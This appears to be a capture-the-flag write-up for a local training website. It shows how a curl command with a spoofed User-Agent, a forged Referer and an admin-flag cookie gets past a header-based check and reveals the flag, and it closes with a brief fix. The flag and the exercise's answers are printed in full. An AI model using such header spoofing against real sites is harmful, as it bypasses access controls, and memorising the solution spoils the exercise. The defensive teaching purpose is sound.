# Breach Name: User-Agent and Referer Manipulation
## Description of the Breach

This breach was identified through a hidden link on the website, which led to a page that provided clues for further exploitation. By manipulating the User-Agent and Referer headers in an HTTP request, we were able to bypass certain conditions and reveal the flag.

## Steps to Reproduce

1. Identify the Hidden Link:

	From the homepage, navigate to the hidden link:
	```bash
	http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
	```

2. Inspect the Page for Clues:

	Upon visiting the hidden link, inspect the page's HTML and review any comments or hidden elements that might provide hints. One of the clues suggests making a request from a website as a specific browser.

3. Capture a Network Request:

	Use the browser's developer tools to navigate to the "Network" tab and capture the HTTP request made when visiting the page.

4. Copy the Request as cURL:

	Right-click on the captured request and select "Copy as cURL". This will give you a cURL command that you can modify to exploit the vulnerability.

5. Modify the User-Agent and Referer Headers:

	Modify the cURL command by changing the User-Agent and Referer headers as per the clues found in the HTML. Use the following modified cURL command:
	```bash
	curl 'http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' \
	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
	-H 'Accept-Language: en-US,en' \
	-H 'Connection: keep-alive' \
	-H 'Cookie: csrftoken=6la8Whx71kgYwiu1HUqby8bGHiSkJf2j9rlT80LuniGLvkJzAtbJNOx4EK5rXVKe; sessionid=wkyan96hdzkvna3h6vfkck2lbsci7d30; I_am_admin=68934a3e9455fa72420237eb05902327' \
	-H 'Referer: https://www.nsa.gov/' \
	-H 'Sec-Fetch-Dest: document' \
	-H 'Sec-Fetch-Mode: navigate' \
	-H 'Sec-Fetch-Site: same-origin' \
	-H 'Sec-Fetch-User: ?1' \
	-H 'Sec-GPC: 1' \
	-H 'Upgrade-Insecure-Requests: 1' \
	-H 'User-Agent: ft_bornToSec' \
	-H 'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"' \
	-H 'sec-ch-ua-mobile: ?0' \
	-H 'sec-ch-ua-platform: "Linux"'
	```

6. Execute the cURL Command:

	Run the modified cURL command in your terminal. This will send the HTTP request with the modified headers to the server.

7. Retrieve the Flag:

	Upon successful execution, the HTML returned from the server will contain the flag. Look for a line similar to this:
	```html
	<center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>
	```

# Explanation of the Breach

The vulnerability exploited here is related to the server’s reliance on specific HTTP headers (User-Agent and Referer) to determine whether to grant access to certain content. By manipulating these headers, we were able to trick the server into revealing sensitive information, in this case, the flag.

# How to Fix the Breach

To prevent this type of vulnerability, the following measures should be implemented:

- Server-Side Validation:

  Implement proper server-side validation and authorization mechanisms. Access to sensitive data should be controlled by secure authentication methods, not by checking HTTP headers.
